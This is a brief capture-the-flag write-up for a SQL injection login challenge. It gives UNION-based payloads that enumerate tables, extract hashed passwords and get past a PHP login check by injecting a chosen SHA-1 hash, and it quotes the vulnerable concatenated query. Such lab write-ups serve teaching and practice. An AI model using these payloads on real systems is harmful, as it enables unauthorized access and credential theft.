If you try to solve it as you solved 1st part of this task it will say a login impossibletoguess.<br>
So, it firstly checks login and then password. We can try to use an ONION query:
<pre>
1' UNION SELECT table_name,123 FROM information_schema.tables WHERE 1='1
</pre>
In the output we see table 'users'. Try to fetch data from it with another query:
<pre>
1' UNION SELECT password,123 FROM users WHERE 1='1
</pre>
So no we have hashed password: 1b2f190ad705d7c2afcac45447a31b053fada0c4.<br>
If you try to log in with it, nothing would happen.<br>
The structure of php validation code is:
<pre>
$query = mysql_query('SELECT * FROM users WHERE username = \''$_POST['username']'\'');
$account = mysql_fetch_assoc($query);
if(sha1($_POST['password']) == $account['password'])
    echo flag;
</pre>
Now we need to use both inputs to make hashes equal.
<pre>
Login input: 1' UNION SELECT username, sha('123') FROM users WHERE 1='1
Password input: 123
</pre>
GL
